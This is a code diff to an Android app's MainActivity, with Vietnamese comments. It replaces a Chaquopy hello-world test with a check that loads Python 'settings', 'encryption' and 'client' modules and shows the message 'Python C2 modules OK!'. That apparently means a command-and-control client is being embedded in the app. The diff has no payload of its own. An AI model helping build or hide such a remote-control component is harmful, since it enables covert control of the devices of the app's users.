@@ -326,24 +326,29 @@ public class MainActivity extends AppCompatActivity {
     // Kiểm tra Chaquopy + gọi thử hàm Python an toàn
     private void checkPythonRuntime() {
         try {
-            // 1) Khởi động Python runtime nếu chưa chạy
             if (!Python.isStarted()) {
                 Python.start(new AndroidPlatform(this));
             }
-
-            // 2) Lấy instance và nạp module
             Python py = Python.getInstance();
-            PyObject module = py.getModule("test_python"); // tương ứng test_python.py
 
-            // 3) Gọi hàm hello trong file test_python.py
-            PyObject result = module.callAttr("hello", "Duong");
-            String msg = "Chaquopy OK: " + result.toString();
+            // Test settings
+            PyObject settingsMod = py.getModule("settings");
+            Log.d("CHAQUOPY_CHECK", "Settings loaded: PORT=" + settingsMod.get("PORT").toString());
 
+            // Test encryption
+            PyObject encMod = py.getModule("encryption");
+            PyObject cipherObj = encMod.get("cipher");
+            Log.d("CHAQUOPY_CHECK", "Encryption cipher ready");
+
+            // Test client init (không chạy main() để tránh loop block)
+            PyObject clientMod = py.getModule("client");
+            Log.d("CHAQUOPY_CHECK", "Client module loaded OK");
+
+            String msg = "Python C2 modules OK!";
             Log.d("CHAQUOPY_CHECK", msg);
-            Toast.makeText(this, msg, Toast.LENGTH_LONG).show();
+            Toast.makeText(this, msg, Toast.LENGTH_SHORT).show();
         } catch (Exception e) {
-            // Nếu lỗi, in ra log + thông báo để biết lý do
-            Log.e("CHAQUOPY_CHECK", "Lỗi Chaquopy: " + e.getMessage(), e);
+            Log.e("CHAQUOPY_CHECK", "Lỗi: " + e.getMessage(), e);
             Toast.makeText(this, "Chaquopy lỗi: " + e.getMessage(), Toast.LENGTH_LONG).show();
         }
     }
